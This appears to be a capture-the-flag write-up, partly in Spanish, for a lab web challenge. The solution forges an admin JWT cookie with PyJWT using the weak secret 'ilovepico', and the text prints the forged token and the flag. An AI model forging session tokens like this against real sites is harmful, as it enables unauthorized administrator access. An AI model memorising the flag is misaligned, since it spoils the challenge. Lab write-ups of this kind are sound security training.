## Descripcion
Check the admin scratchpad! [http://chatelaine.cylabacademy.net:10002](http://chatelaine.cylabacademy.net:10002/)

What is that cookie?

Have you heard of JWT?
## solucion 
![[Pasted image 20261005232330.png]]

![[Pasted image 20261005232355.png]]

```

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ python3 -m venv venv

┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ source venv/bin/activate

┌──(venv)(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ pip install PyJWT
Collecting PyJWT
  Downloading pyjwt-2.15.1-py3-none-any.whl.metadata (3.5 kB)
Downloading pyjwt-2.15.1-py3-none-any.whl (33 kB)
Installing collected packages: PyJWT
Successfully installed PyJWT-2.15.1

┌──(venv)(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ python
Python 3.14.7 (main, Sep  5 2026, 05:55:41) [GCC 16.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> payload = {
...     "user": "admin"
... }
>>> clave_secreta = "ilovepico"
>>> token_falsificado = jwt.encode(payload, clave_secreta, algorithm="HS256")
/home/jeex/venv/lib/python3.14/site-packages/jwt/api_jwt.py:149: InsecureKeyLengthWarning: The HMAC key is 9 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.
  return self._jws.encode(
>>> print(token_falsificado)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.di2J1a0H3IhZtGmIfw7ltVq7sZL2orh8WIP1isDkgdw
>>>
```
![[Pasted image 20261005234010.png]]
![[Pasted image 20261005234121.png]]
```
academy{jawt_was_just_what_you_thought_5f6b65b1}
```
## notas adicionales

## referencias
